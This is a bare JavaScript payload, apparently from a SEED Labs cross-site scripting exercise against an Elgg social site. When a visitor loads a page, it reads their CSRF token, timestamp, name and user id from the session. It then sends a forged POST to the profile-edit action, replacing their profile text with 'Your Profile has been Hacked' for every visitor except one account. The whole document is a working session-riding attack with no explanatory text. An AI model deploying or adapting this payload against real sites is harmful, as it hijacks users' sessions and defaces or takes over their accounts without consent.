<script type="text/javascript">

window.onload = async function() {
	// set the timestamp and secret token parameters
     const TIME_STAMP ="&__elgg_ts=" + elgg.security.token.__elgg_ts;
     const TOKEN ="&__elgg_token=" + elgg.security.token.__elgg_token;
     const UNAME = "&name=" + elgg.session.user.name;
     const DESCRIPTION = "&description=<p>Your Profile has been 		Hacked.... HAHAHAAHA.</p>" + "&accesslevel[description]=2"
     const BRIEF_DESCRIPTION = "&briefdescription=Sammy is my hero...."+"&accesslevel[briefdescription]=2"
     const USERID = "&guid=" + elgg.session.user.guid;
     
     const CONTENT = TOKEN + TIME_STAMP + UNAME + DESCRIPTION + BRIEF_DESCRIPTION + USERID
     
     const URL = "http://www.seed-server.com/action/profile/edit"
     
     if (elgg.session.user.guid != 59) {
     	try{
     	await fetch(URL, {
     	method: "POST",
     	headers:{
     		"content-type": "application/x-www-form-urlencoded"
     		},
     	body: CONTENT
     	
     	});
     }catch(error){
     
     	console.log(error);
     }
     }
     
     
     
}

</script>
